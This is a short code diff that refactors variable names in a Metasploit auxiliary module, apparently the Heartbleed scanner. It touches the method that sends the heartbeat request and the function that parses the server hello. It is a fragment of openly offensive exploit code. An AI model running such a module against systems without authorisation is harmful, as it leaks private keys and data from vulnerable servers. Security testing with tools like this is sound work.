@@ -302,11 +302,11 @@ class Metasploit3 < Msf::Auxiliary
 
   def bleed
     # This actually performs the heartbleed portion
-    connect_result = establish_connect
-    return if connect_result.nil?
+    server_tls_version = establish_connect
+    return if server_tls_version.nil?
 
     vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat(heartbeat_length, connect_result))
+    sock.put(heartbeat(heartbeat_length, server_tls_version))
     hdr = sock.get_once(5, response_timeout)
     if hdr.blank?
       vprint_error("#{peer} - No Heartbeat response...")
@@ -536,12 +536,12 @@ class Metasploit3 < Msf::Auxiliary
     version = unpacked[1]
     len = unpacked[2]
 
-    unless unpacked[0] == HANDSHAKE_RECORD_TYPE
+    unless type == HANDSHAKE_RECORD_TYPE
       vprint_error("#{peer} - Server Hello Not Found")
       return nil
     end
 
-    unpacked[1]
+    version
   end
 
   def key_from_pqe(p, q, e)
